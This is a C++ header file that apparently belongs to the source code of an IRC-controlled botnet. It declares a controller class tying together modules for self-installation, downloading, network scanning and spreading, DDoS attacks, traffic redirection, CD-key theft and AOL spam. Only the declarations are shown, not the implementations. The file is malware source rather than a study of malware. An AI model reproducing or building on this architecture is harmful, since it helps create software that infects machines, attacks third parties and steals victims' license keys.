
#ifndef __MAINCTRL_H__
#define __MAINCTRL_H__

#include "cmdline.h"
#include "cstring.h"
#include "consdbg.h"
#include "random.h"
#include "utility.h"
#include "cvar.h"
#include "bot.h"
#include "commands.h"
#include "mac.h"
#include "installer.h"
#include "scanner.h"
#include "irc.h"
#include "ddos.h"
#include "rsalib.h"
#include "redirect.h"
#include "cdkeygrab.h"

#ifdef WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hprev, PSTR cmdline, int ishow);
#else
int main(int argc, char **argv);
#endif

class CMainCtrl
{
public:
	int Main(const char *szCmdLine, const char *szArgv0);
	int MainCtrl();

	CCommands			m_cCommands;
	CCmdLine			m_cCmdLine;
	CConsDbg			m_cConsDbg;
	CBot				m_cBot;
	CMac				m_cMac;
	CCVar				m_cCVar;
	CInstaller			m_cInstaller;
	CDownloader			m_cDownloader;
	CScanner			m_cScanner;
	CScannerAuto		m_cScannerAuto;
	CIRC				m_cIRC;
	CSendFile			m_cSendFile;
	CIdentD				m_cIdentD;
	CDDOS				m_cDDOS;
	CRSALib				m_cRSALib;
	CRedirect			m_cRedirect;
	CCDKeyGrab			m_cCDKeyGrab;
	CRSLControl			m_cRSLControl;

	bool				m_bRunning;
	CString				m_sUserName;
	CString				m_sNameVerStr;
	CString				m_sArgv0;
	bool				m_bIdentD_Running;

	bool				m_bCanSpamAOL;

	list<CThread*>		m_lCanJoin;
};

extern CMainCtrl g_cMainCtrl;

#endif // __MAINCTRL_H__
